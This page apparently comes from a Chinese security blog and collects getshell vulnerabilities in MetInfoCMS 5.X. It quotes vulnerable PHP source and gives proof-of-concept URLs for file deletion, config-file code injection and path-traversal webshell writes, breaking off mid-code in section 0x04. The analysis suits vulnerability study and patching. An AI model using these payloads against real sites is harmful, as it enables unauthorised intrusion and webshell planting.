@@ -1,0 +1,340 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head><meta name="generator" content="Hexo 3.8.0">
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
+    <meta name="description" content="MetInfoCMS 5.X版本GETSHELL漏洞合集   0x00 前言2018年1月底MetInfoCMS官方隆重发布6.0版本，调整了之前“漏洞百出”的框架结构，修（杜）复（绝）了多个5.X的版本后台Gestshell漏洞。 0x01安装过程过滤不严导致Getshell前提:有删除/config/install.lock权限  默认安装的时候设置了权限的@chmod(‘../config/">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ALL BLUE">
+<meta property="og:url" content="http://allblue147.github.io/2021/07/16/01-CMS漏洞/MetinfoCMS/MetInfoCMS 5.X版本GETSHELL漏洞合集/index.html">
+<meta property="og:site_name" content="ALL BLUE">
+<meta property="og:description" content="MetInfoCMS 5.X版本GETSHELL漏洞合集   0x00 前言2018年1月底MetInfoCMS官方隆重发布6.0版本，调整了之前“漏洞百出”的框架结构，修（杜）复（绝）了多个5.X的版本后台Gestshell漏洞。 0x01安装过程过滤不严导致Getshell前提:有删除/config/install.lock权限  默认安装的时候设置了权限的@chmod(‘../config/">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2021-03-24T15:33:31.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="ALL BLUE">
+<meta name="twitter:description" content="MetInfoCMS 5.X版本GETSHELL漏洞合集   0x00 前言2018年1月底MetInfoCMS官方隆重发布6.0版本，调整了之前“漏洞百出”的框架结构，修（杜）复（绝）了多个5.X的版本后台Gestshell漏洞。 0x01安装过程过滤不严导致Getshell前提:有删除/config/install.lock权限  默认安装的时候设置了权限的@chmod(‘../config/">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>ALL BLUE</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" "top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+        
+      </ul>
+    </span>
+    <br>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇 " href="/2021/07/16/01-CMS漏洞/MiniCMS/MiniCMS 1.10存在CSRF漏洞可增加管理员账户/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇 " href="/2021/07/16/01-CMS漏洞/MetinfoCMS/Metinfo-6.1.2版本存在XSS漏洞&SQL注入漏洞/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部 " href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章 " href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://allblue147.github.io/2021/07/16/01-CMS漏洞/MetinfoCMS/MetInfoCMS 5.X版本GETSHELL漏洞合集/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://allblue147.github.io/2021/07/16/01-CMS漏洞/MetinfoCMS/MetInfoCMS 5.X版本GETSHELL漏洞合集/&text="><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://allblue147.github.io/2021/07/16/01-CMS漏洞/MetinfoCMS/MetInfoCMS 5.X版本GETSHELL漏洞合集/&title="><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://allblue147.github.io/2021/07/16/01-CMS漏洞/MetinfoCMS/MetInfoCMS 5.X版本GETSHELL漏洞合集/&is_video=false&description="><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=&body=Check out this article: http://allblue147.github.io/2021/07/16/01-CMS漏洞/MetinfoCMS/MetInfoCMS 5.X版本GETSHELL漏洞合集/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://allblue147.github.io/2021/07/16/01-CMS漏洞/MetinfoCMS/MetInfoCMS 5.X版本GETSHELL漏洞合集/&title="><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://allblue147.github.io/2021/07/16/01-CMS漏洞/MetinfoCMS/MetInfoCMS 5.X版本GETSHELL漏洞合集/&title="><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://allblue147.github.io/2021/07/16/01-CMS漏洞/MetinfoCMS/MetInfoCMS 5.X版本GETSHELL漏洞合集/&title="><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://allblue147.github.io/2021/07/16/01-CMS漏洞/MetinfoCMS/MetInfoCMS 5.X版本GETSHELL漏洞合集/&title="><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://allblue147.github.io/2021/07/16/01-CMS漏洞/MetinfoCMS/MetInfoCMS 5.X版本GETSHELL漏洞合集/&name=&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://allblue147.github.io/2021/07/16/01-CMS漏洞/MetinfoCMS/MetInfoCMS 5.X版本GETSHELL漏洞合集/&t="><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-前言"><span class="toc-number">1.</span> <span class="toc-text">0x00 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01安装过程过滤不严导致Getshell"><span class="toc-number">2.</span> <span class="toc-text">0x01安装过程过滤不严导致Getshell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-结合网上爆出的后台任意文件删除漏洞"><span class="toc-number">2.1.</span> <span class="toc-text">1. 结合网上爆出的后台任意文件删除漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-重装时数据库配置文件过滤不当"><span class="toc-number">2.2.</span> <span class="toc-text">2. 重装时数据库配置文件过滤不当</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-POC"><span class="toc-number">2.3.</span> <span class="toc-text">3. POC</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-CVE-2017-11347补丁绕过继续Getshell"><span class="toc-number">3.</span> <span class="toc-text">0x02 CVE-2017-11347补丁绕过继续Getshell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-查找绝对路径的方法："><span class="toc-number">3.1.</span> <span class="toc-text">1. 查找绝对路径的方法：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-漏洞分析"><span class="toc-number">3.2.</span> <span class="toc-text">2. 漏洞分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-POC-注意左斜杠和右斜杠不能随意更改-："><span class="toc-number">3.3.</span> <span class="toc-text">3. POC(注意左斜杠和右斜杠不能随意更改)：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-Copyindx函数处理不当Getshell"><span class="toc-number">4.</span> <span class="toc-text">0x03 Copyindx函数处理不当Getshell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-声明"><span class="toc-number">4.1.</span> <span class="toc-text">1. 声明</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-漏洞点"><span class="toc-number">4.2.</span> <span class="toc-text">2. 漏洞点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-POC-xxx为任意的shell目录，index-php文件名不能修改"><span class="toc-number">4.3.</span> <span class="toc-text">3. POC(xxx为任意的shell目录，index.php文件名不能修改)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-olupdate文件缺陷导致Getshell"><span class="toc-number">5.</span> <span class="toc-text">0x04 olupdate文件缺陷导致Getshell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-漏洞点"><span class="toc-number">5.1.</span> <span class="toc-text">1. 漏洞点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-POC-参数addr为生成shell的目录，生成shell的文件名sqlist-php不可控"><span class="toc-number">5.2.</span> <span class="toc-text">2.POC (参数addr为生成shell的目录，生成shell的文件名sqlist.php不可控)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05小结"><span class="toc-number">6.</span> <span class="toc-text">0x05小结</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">JYP</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2021-07-16T03:12:36.747Z" itemprop="datePublished">2021-07-16</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>MetInfoCMS 5.X版本GETSHELL漏洞合集  </p>
+<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>2018年1月底MetInfoCMS官方隆重发布6.0版本，调整了之前“漏洞百出”的框架结构，修（杜）复（绝）了多个5.X的版本后台Gestshell漏洞。</p>
+<h2 id="0x01安装过程过滤不严导致Getshell"><a href="#0x01安装过程过滤不严导致Getshell" class="headerlink" title="0x01安装过程过滤不严导致Getshell"></a>0x01安装过程过滤不严导致Getshell</h2><p><em>前提:有删除/config/install.lock权限</em></p>
+<blockquote>
+<p>默认安装的时候设置了权限的@chmod(‘../config/install.lock’,0554);，所以需要在权限修改了的情况下才能利用这个</p>
+</blockquote>
+<h3 id="1-结合网上爆出的后台任意文件删除漏洞"><a href="#1-结合网上爆出的后台任意文件删除漏洞" class="headerlink" title="1. 结合网上爆出的后台任意文件删除漏洞"></a>1. 结合网上爆出的后台任意文件删除漏洞</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#/admin/app/batch/csvup.php</span></span><br><span class="line"></span><br><span class="line">$classflie=explode(<span class="string">'_'</span>,$fileField);</span><br><span class="line">$classflie=explode(<span class="string">'-'</span>,$classflie[count($classflie)<span class="number">-1</span>]);</span><br><span class="line">$class1=$classflie[<span class="number">0</span>];</span><br><span class="line">$class2=$classflie[<span class="number">1</span>];</span><br><span class="line">$class3=$classflie[<span class="number">2</span>];</span><br><span class="line">$class=$class3?$class3:($class2?$class2:$class1); </span><br><span class="line">$classcsv=$db-&gt;get_one(<span class="string">"select * from $met_column where id=$class"</span>);</span><br><span class="line"><span class="keyword">if</span>(!$classcsv)&#123;</span><br><span class="line">metsave(<span class="string">"../app/batch/contentup.php?anyid=$anyid&amp;lang=$lang"</span>,$lang_csvnocolumn,$depth);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 省略代码</span></span><br><span class="line"></span><br><span class="line">@file_unlink($flienamecsv);</span><br></pre></td></tr></table></figure>
+<p>删除/config/install.lock文件可以导致重装（需要由对应的删除权限），删除文件的poc如下：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx.com/admin/app/batch/csvup.php?fileField=1_1231-1&amp;flienamecsv=../../../config/install.lock</span><br></pre></td></tr></table></figure>
+<h3 id="2-重装时数据库配置文件过滤不当"><a href="#2-重装时数据库配置文件过滤不当" class="headerlink" title="2. 重装时数据库配置文件过滤不当"></a>2. 重装时数据库配置文件过滤不当</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#/install/index.php</span></span><br><span class="line">    <span class="keyword">case</span> <span class="string">'db_setup'</span>:</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>($setup==<span class="number">1</span>)&#123;</span><br><span class="line">            $db_prefix      = trim($db_prefix);</span><br><span class="line">            $db_host        = trim($db_host);</span><br><span class="line">            $db_username    = trim($db_username);</span><br><span class="line">            $db_pass        = trim($db_pass);</span><br><span class="line">            $db_name        = trim($db_name);</span><br><span class="line">            $config=<span class="string">"&lt;?php</span></span><br><span class="line"><span class="string">                   /*</span></span><br><span class="line"><span class="string">                   con_db_host = \"$db_host\"</span></span><br><span class="line"><span class="string">                   con_db_id   = \"$db_username\"</span></span><br><span class="line"><span class="string">                   con_db_pass    = \"$db_pass\"</span></span><br><span class="line"><span class="string">                   con_db_name = \"$db_name\"</span></span><br><span class="line"><span class="string">                   tablepre    =  \"$db_prefix\"</span></span><br><span class="line"><span class="string">                   db_charset  =  \"utf8\";</span></span><br><span class="line"><span class="string">                  */</span></span><br><span class="line"><span class="string">                  ?&gt;"</span>;</span><br><span class="line"></span><br><span class="line">            $fp=fopen(<span class="string">"../config/config_db.php"</span>,<span class="string">'w+'</span>);</span><br><span class="line">            fputs($fp,$config);</span><br><span class="line">            fclose($fp);</span><br></pre></td></tr></table></figure>
+<p>在数据库配置时$db_host,$db_username,$db_pass,$db_name,$db_prefix参数可控。</p>
+<h3 id="3-POC"><a href="#3-POC" class="headerlink" title="3. POC"></a>3. POC</h3><p>数据库配置时修改任意参数为<code>*/phpinfo();/*</code>可导致Getshell。点击保存之后，直接访问/config/config_db.php即可getshell。<br>shell地址:<code>http://xxx.com/config/config_db.php</code></p>
+<h2 id="0x02-CVE-2017-11347补丁绕过继续Getshell"><a href="#0x02-CVE-2017-11347补丁绕过继续Getshell" class="headerlink" title="0x02 CVE-2017-11347补丁绕过继续Getshell"></a>0x02 CVE-2017-11347补丁绕过继续Getshell</h2><p><em>前提：windows服务器+网站绝对路径（只需要知道网站index.php所在目录的上一级目录名）</em></p>
+<h3 id="1-查找绝对路径的方法："><a href="#1-查找绝对路径的方法：" class="headerlink" title="1. 查找绝对路径的方法："></a>1. 查找绝对路径的方法：</h3><ul>
+<li><p>利用安装目录下的phpinfo文件： <code>/install/phpinfo.php</code></p>
+</li>
+<li><p>利用报错信息(</p>
+<p>信息在HTML注释中，必须通过查看网页源码的方式才能获取内容，否则看上去是空白页</p>
+<p>)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/app/system/include/public/ui/admin/top.php</span><br><span class="line">/app/system/include/public/ui/admin/box.php</span><br><span class="line">/app/system/include/public/ui/web/sidebar.php</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<h3 id="2-漏洞分析"><a href="#2-漏洞分析" class="headerlink" title="2. 漏洞分析"></a>2. 漏洞分析</h3><p>5.3.19版本针对CVE-2017-11347的补丁分析</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">switch($val[2])&#123;</span><br><span class="line">   case 1:</span><br><span class="line">      $address=&quot;../about/$fileaddr[1]&quot;;</span><br><span class="line">   break;</span><br><span class="line">   case 2:</span><br><span class="line">      $address=&quot;../news/$fileaddr[1]&quot;;</span><br><span class="line">   break;</span><br><span class="line">   case 3:</span><br><span class="line">      $address=&quot;../product/$fileaddr[1]&quot;;</span><br><span class="line">   break;</span><br><span class="line">   case 4:</span><br><span class="line">      $address=&quot;../download/$fileaddr[1]&quot;;</span><br><span class="line">   break;</span><br><span class="line">   case 5:</span><br><span class="line">      $address=&quot;../img/$fileaddr[1]&quot;;</span><br><span class="line">   break;</span><br><span class="line">   case 8:</span><br><span class="line">      $address=&quot;../feedback/$fileaddr[1]&quot;;</span><br><span class="line">   break;</span><br><span class="line">   default:</span><br><span class="line">      $address = &quot;&quot;;</span><br><span class="line">   break;</span><br><span class="line"></span><br><span class="line">&#125;   </span><br><span class="line">   $newfile  =&quot;../../../$val[1]&quot;; </span><br><span class="line">   if($address != &apos;&apos;)&#123;</span><br><span class="line">      Copyfile($address,$newfile);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>即：5.3.19版本采取：即使在$var[2]为空时，默认给address变量赋值为空，并且会判断address参数不为空才调用Copyfile。但是当$var[2]不为空时，由于fileaddr[1]可控导致，仍然可以控制文件路径从而Getshell。</p>
+<p>漏洞利用(网站安装在服务器根路径的情况)：</p>
+<p>第一步，新建1.ico文件，内容为：&lt;?php phpinfo();?&gt;<br>在后台”地址栏图标”处上传该文件。<br>得到地址为：<a href="http://localhost/upload/file/1506587082.ico" target="_blank" rel="noopener">http://localhost/upload/file/1506587082.ico</a></p>
+<p>第二步，发送如下payload(注意左斜杠和右斜杠不能随意更改):</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/admin/app/physical/physical.php?action=op&amp;op=3&amp;valphy=test|/..\upload\file\1506587082.ico/..\..\..\www\about\shell.php|1</span><br></pre></td></tr></table></figure>
+<p>shell的地址为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/about/shell.php</span><br></pre></td></tr></table></figure>
+<h3 id="3-POC-注意左斜杠和右斜杠不能随意更改-："><a href="#3-POC-注意左斜杠和右斜杠不能随意更改-：" class="headerlink" title="3. POC(注意左斜杠和右斜杠不能随意更改)："></a>3. POC(注意左斜杠和右斜杠不能随意更改)：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/admin/app/physical/physical.php?action=op&amp;op=3&amp;valphy=test|/..\上传ico文件的相对路径/..\..\..\网站index.php路径的上一层目录名\about\webshell的文件名|1</span><br></pre></td></tr></table></figure>
+<p>特别注意其中的：“网站index.php上层目录名”，</p>
+<p>1.如果网站安装在服务器根目录，这wamp/phpstudy默认目录值为“www”；网站index.php上层目录名设置为”www”; 如果为lamp环境，这默认目录值为“html”网站index.php上层目录名设置为”html”;。其他的环境类推（利用绝对路径泄露）。</p>
+<p>2.如果网站安装在服务器的二级目录下，则网站index.php上层目录名设置为二级目录名。</p>
+<p>例如:网站搭建在:<a href="http://localhost/MetInfoCMS" target="_blank" rel="noopener">http://localhost/MetInfoCMS</a> /,则第二步的payload如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/MetInfoCMS/admin/app/physical/physical.php?action=op&amp;op=3&amp;valphy=test|/..\upload\file\1506588072.ico/..\MetInfoCMS.\MetInfoCMS \about\shell.php|1</span><br></pre></td></tr></table></figure>
+<p>相应生成的shell地址为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/MetInfoCMS/about/shell.php</span><br></pre></td></tr></table></figure>
+<h2 id="0x03-Copyindx函数处理不当Getshell"><a href="#0x03-Copyindx函数处理不当Getshell" class="headerlink" title="0x03 Copyindx函数处理不当Getshell"></a>0x03 Copyindx函数处理不当Getshell</h2><h3 id="1-声明"><a href="#1-声明" class="headerlink" title="1. 声明"></a>1. 声明</h3><p>此漏洞点位于admin/app/physical/physical.php文件，漏洞和CVE-2017-11347漏洞十分相似，但是存在根本的差异，不同点如下：</p>
+<p>（1）触发函数是Copyindex函数，而非Copyfile</p>
+<p>（2）此漏洞不是利用文件包含require_one，而是利用任意内容写入</p>
+<p>（3）此漏洞Getshell不需要上传图片</p>
+<p>（4）结合CSRF可以实现一键Getshell</p>
+<h3 id="2-漏洞点"><a href="#2-漏洞点" class="headerlink" title="2. 漏洞点"></a>2. 漏洞点</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"># admin/app/physical/physical.php:197-236</span><br><span class="line"></span><br><span class="line">switch($op)&#123;</span><br><span class="line">   case 1:</span><br><span class="line">   if(is_dir(&apos;../../../&apos;.$val[1]))&#123;</span><br><span class="line">      deldir(&apos;../../../&apos;.$val[1]);</span><br><span class="line">      echo $lang_physicaldelok;</span><br><span class="line">   &#125;</span><br><span class="line">   else&#123;unlink(&apos;../../../&apos;.$val[1]);</span><br><span class="line">      echo $lang_physicaldelok;</span><br><span class="line">      &#125;</span><br><span class="line">   break;</span><br><span class="line">   case 2:</span><br><span class="line">      $adminfile=$url_array[count($url_array)-2];</span><br><span class="line">      $strsvalto=readmin($val[1],$adminfile,1);</span><br><span class="line">      filetest(&apos;../../../&apos;.$val[1]);</span><br><span class="line">      deldir(&apos;../../../&apos;.$val[1]);</span><br><span class="line">      $dlappfile=parse_ini_file(&apos;dlappfile.php&apos;,true);</span><br><span class="line">      if($dlappfile[$strsvalto][&apos;dlfile&apos;])&#123;</span><br><span class="line">         $return=varcodeb(&apos;app&apos;);</span><br><span class="line">         $checksum=$return[&apos;md5&apos;];</span><br><span class="line">         $met_file=&apos;/dl/app_curl.php&apos;;</span><br><span class="line">         $stringfile=dlfile($dlappfile[$strsvalto][&apos;dlfile&apos;],&quot;../../../$val[1]&quot;);</span><br><span class="line">      &#125;else&#123;</span><br><span class="line">         $met_file=&apos;/dl/olupdate_curl.php&apos;;</span><br><span class="line">         $stringfile=dlfile(&quot;v$metcms_v/$strsvalto&quot;,&quot;../../../$val[1]&quot;);</span><br><span class="line">      &#125;</span><br><span class="line">      if($stringfile==1)&#123;</span><br><span class="line">         echo $lang_physicalupdatesuc;</span><br><span class="line">      &#125;</span><br><span class="line">      else&#123;</span><br><span class="line">         echo dlerror($stringfile);</span><br><span class="line">         die();</span><br><span class="line">      &#125;</span><br><span class="line">   break;</span><br><span class="line">   case 3:</span><br><span class="line">      $fileaddr=explode(&apos;/&apos;,$val[1]);</span><br><span class="line">      $filedir=&quot;../../../&quot;.$fileaddr[0];  </span><br><span class="line">      if(!file_exists($filedir))&#123; @mkdir ($filedir, 0777); &#125; </span><br><span class="line">      if($fileaddr[1]==&quot;index.php&quot;)&#123;</span><br><span class="line">         Copyindx(&quot;../../../&quot;.$val[1],$val[2]);</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>
+<p>当$action等于op而且$op等于3的时候，如果$filedir不存在则创建$filedir目录，而且如果$fileaddr[1]等于”index.php”则调用Copyindex函数，并传入$val[1]和$val[2]参数，此处两个参数来自变量$valphy,均可控！！跟进Copyindex函数源码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#admin/include/global.func.php:877-884</span><br><span class="line"></span><br><span class="line">function Copyindx($newindx,$type)&#123;</span><br><span class="line">   if(!file_exists($newindx))&#123;</span><br><span class="line">      $oldcont =&quot;&lt;?php\n# xxx Enterprise Content Management System \n# Copyright (C) xxx Co.,Ltd (http://www.xxx.cn). All rights reserved. \n\$filpy = basename(dirname(__FILE__));\n\$fmodule=$type;\nrequire_once &apos;../include/module.php&apos;; \nrequire_once \$module; \n# This program is an open source system, commercial use, please consciously to purchase commercial license.\n# Copyright (C) xxx Co., Ltd. (http://www.xxx.cn). All rights reserved.\n?&gt;&quot;;</span><br><span class="line">      $fp = fopen($newindx,w);</span><br><span class="line">      fputs($fp, $oldcont);</span><br><span class="line">      fclose($fp);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可见，直接把参数$type直接赋值给$fmodule,并写入文件内容，所以可以构造payload直接getshell.</p>
+<h3 id="3-POC-xxx为任意的shell目录，index-php文件名不能修改"><a href="#3-POC-xxx为任意的shell目录，index-php文件名不能修改" class="headerlink" title="3. POC(xxx为任意的shell目录，index.php文件名不能修改)"></a>3. POC(xxx为任意的shell目录，index.php文件名不能修改)</h3><p>生成的shell地址：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/MetInfoCMS/xxx/index.php</span><br></pre></td></tr></table></figure>
+<h2 id="0x04-olupdate文件缺陷导致Getshell"><a href="#0x04-olupdate文件缺陷导致Getshell" class="headerlink" title="0x04 olupdate文件缺陷导致Getshell"></a>0x04 olupdate文件缺陷导致Getshell</h2><h3 id="1-漏洞点"><a href="#1-漏洞点" class="headerlink" title="1. 漏洞点"></a>1. 漏洞点</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span 